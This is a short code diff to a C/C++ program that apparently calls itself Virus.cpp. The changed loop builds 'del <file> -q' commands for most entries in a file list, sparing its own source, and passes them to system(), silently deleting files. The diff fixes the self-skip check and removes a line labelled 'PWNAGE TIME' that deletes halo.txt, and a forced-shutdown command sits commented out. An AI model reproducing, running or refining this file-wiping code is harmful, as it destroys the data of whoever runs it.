@@ -28,14 +28,13 @@ int main()
 	for(int j=0;j<i;j++)
 	{
 		if(j==0 || j==1) continue;
-		if(simpan[j]=="Virus.cpp") continue;
-		char command[200];    // 200 is just an example value that can hold the whole string
+		if(strcmp(simpan[j],"Virus.cpp") == 0) continue;
+		char command[500];    // 200 is just an example value that can hold the whole string
 		sprintf(command, "del %s -q", simpan[j]);
-		printf("%s",command);
+		printf("%s\n",command);
 		system(command);
 	}
 	
-    system("del halo.txt -q"); //PWNAGE TIME
 	//system("%SystemRoot%\\system32\\shutdown.exe -s -f -t 00");
 	//system("PAUSE");
     return EXIT_SUCCESS;
